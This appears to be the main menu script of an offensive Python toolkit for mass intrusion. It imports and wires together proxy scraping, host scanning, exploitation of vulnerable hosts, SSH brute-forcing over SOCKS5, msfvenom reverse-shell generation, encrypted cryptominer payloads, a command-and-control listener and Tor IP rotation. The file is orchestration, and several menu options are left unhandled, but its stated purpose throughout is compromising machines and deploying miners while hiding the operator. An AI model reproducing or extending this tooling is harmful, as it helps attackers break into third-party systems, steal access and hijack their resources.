from globals import (
    global_hosts,
    global_live_hosts,
    global_vulnerable_hosts,
    global_scraped_proxies,
    global_tested_proxies,
    global_active_sessions,
    global_config,
    global_generated_payloads,
    global_error_log,
    global_scan_stats,
    global_wordlist_paths,
    pause_event,
    stop_event,
)
from modules.proxy_handler import (
    load_proxies,
    test_proxies,
    scrape_proxies,
    add_proxy_sources,
    load_checked_proxies,
    clear_proxies,
)
from modules.host_handler import (
    load_hosts,
    load_ip_ranges,
    test_hosts,
    load_previous_hosts,
)
from modules.scanner import scan_hosts, show_results, clear_results
from modules.exploit import identify_vulnerable_hosts, exploit_vulnerable_hosts
from modules.utils import clear_all_chunks, split_large_csvs, ensure_wordlists, ensure_valid_hosts
from modules.bruteforce import load_wordlists, bruteforce_ssh
from modules.config_handler import configure_settings
from modules.shell_generator import generate_msfvenom_shell, encrypt_generated_shell, list_payloads
from modules.miner_payload import encrypt_all_cryptominers, list_cryptominers
from modules.command_control import start_listener, c2_interface, start_apache_server, stop_listeners
from modules.tor_handler import start_tor, renew_tor_ip, stop_tor
from modules.go_bruteforce import run_golang_bruteforce

import os
import keyboard
import threading
from termcolor import colored
import time

# Dictionary to track active background tasks
active_tasks = {}

# Proxy & Host scanning counters
proxy_stats = {"total": 0, "testing": 0, "valid": 0, "dead": 0, "remaining": 0}
host_stats = {"total": 0, "scanning": 0, "valid": 0, "dead": 0, "remaining": 0}
brute_stats = {"running": 0, "success": 0, "failed": 0}


def stop_all_background_tasks():
    """
    Gracefully stop all running background tasks.
    """
    print("[INFO] Stopping all background tasks...")
    stop_event.set()
    for task_name, thread in active_tasks.items():
        if thread.is_alive():
            print(f"[INFO] Stopping {task_name}...")
            thread.join()


def toggle_background_task(task_name, function, *args):
    """
    Manage background tasks:
    - Start new task if not running
    - Resume existing task if already running
    - Stop task if user requests

    :param task_name: Unique name for the background task
    :param function: Function to execute
    :param args: Arguments to pass to the function
    """
    if task_name in active_tasks and active_tasks[task_name].is_alive():
        print(f"[INFO] Resuming {task_name}...")
        active_tasks[task_name].join()
    else:
        print(f"[INFO] Starting {task_name} in background...")
        thread = threading.Thread(target=function, args=args, daemon=True)
        active_tasks[task_name] = thread
        thread.start()


def status_text(task_name):
    """
    Display 'CURRENTLY RUNNING' status in green for active tasks.
    """
    if task_name in active_tasks and active_tasks[task_name].is_alive():
        return colored("[CURRENTLY RUNNING]", "green")
    return ""


def display_statistics():
    """
    Display real-time statistics of proxy and host scanning.
    """
    active_task_count = sum(1 for task in active_tasks.values() if task.is_alive())

    print("\n\033[1;34m[ SYSTEM STATISTICS ]\033[0m")
    print(f"Active Background Tasks: {colored(active_task_count, 'yellow')}")

    # ** Proxy Stats **
    print(f"📡 Proxies: {colored(proxy_stats['total'], 'cyan')} Total | "
          f"{colored(proxy_stats['testing'], 'blue')} Testing | "
          f"{colored(proxy_stats['valid'], 'green')} Valid | "
          f"{colored(proxy_stats['dead'], 'red')} Dead | "
          f"{colored(proxy_stats['remaining'], 'yellow')} Remaining")

    # ** Host Scanning Stats **
    print(f"🌐 Hosts: {colored(host_stats['total'], 'cyan')} Total | "
          f"{colored(host_stats['scanning'], 'blue')} Scanning | "
          f"{colored(host_stats['valid'], 'green')} Live | "
          f"{colored(host_stats['dead'], 'red')} Dead | "
          f"{colored(host_stats['remaining'], 'yellow')} Remaining")

    # ** Brute-force Stats **
    print(f"🔑 Brute-force: {colored(brute_stats['running'], 'blue')} Running | "
          f"{colored(brute_stats['success'], 'green')} Success | "
          f"{colored(brute_stats['failed'], 'red')} Failed")


def main_menu():
    while True:
        # Clear screen
        print("\033[H\033[J", end="")

        # Display statistics
        display_statistics()

        # ** Main Menu **
        print("\n[ Main Menu ]")
        print(f"1.) Add Proxy Sources")
        print(f"2.) Scrape Proxies")
        print(f"3.) Load Proxies")
        print(f"4.) Test Proxies {status_text('proxy_test')}")
        print(f"5.) Load Checked Proxies")
        print(f"6.) Clear Proxies")
        print(f"7.) Load Hosts")
        print(f"8.) Load IP Ranges")
        print(f"9.) Load Previously Tested Hosts")
        print(f"10.) Test Hosts {status_text('host_test')}")
        print(f"11.) Scan Hosts {status_text('host_scan')}")
        print(f"12.) Show Results")
        print(f"13.) Clear Results")
        print(f"14.) Identify Vulnerabilities")
        print(f"15.) Exploit Vulnerable Hosts")
        print(f"16.) Clear All Chunks")
        print(f"17.) Split Large CSVs")
        print(f"18.) Python SSH Bruteforce {status_text('python_brute')}")
        print(f"19.) Golang SSH Bruteforce (w/ SOCKS5) {status_text('go_brute')}")
        print(f"20.) Configuration Settings")
        print(f"21.) Generate Reverse Shell")
        print(f"22.) Manage Cryptominers")
        print(f"23.) Command and Control Center")
        print(f"24.) Start/Stop Tor Proxy")
        print(f"25.) Exit")

        choice = input("Enter your choice: ")
        if choice == "1":
            add_proxy_sources()
        elif choice == "2":
            scrape_proxies()
        elif choice == "3":
            global_scraped_proxies[:] = load_proxies()
        elif choice == "4":
            toggle_background_task("proxy_test", test_proxies, global_scraped_proxies)
        elif choice == "5":
            global_tested_proxies[:] = load_checked_proxies()
        elif choice == "6":
            clear_proxies()
        elif choice == "10":
            toggle_background_task("host_test", test_hosts, global_hosts, global_tested_proxies)
        elif choice == "11":
            toggle_background_task("host_scan", scan_hosts)
        elif choice == "18":
            toggle_background_task("python_brute", bruteforce_ssh, global_live_hosts)
        elif choice == "19":
            toggle_background_task("go_brute", run_golang_bruteforce, global_live_hosts)
        elif choice == "25":
            stop_all_background_tasks()
            break


def setup_keyboard_controls():
    keyboard.add_hotkey("F5", lambda: pause_event.set() if not pause_event.is_set() else pause_event.clear())
    keyboard.add_hotkey("F6", lambda: stop_event.set())
    print("[INFO] Press F5 to pause/resume and F6 to stop scanning.")


setup_keyboard_controls()

if __name__ == "__main__":
    main_menu()
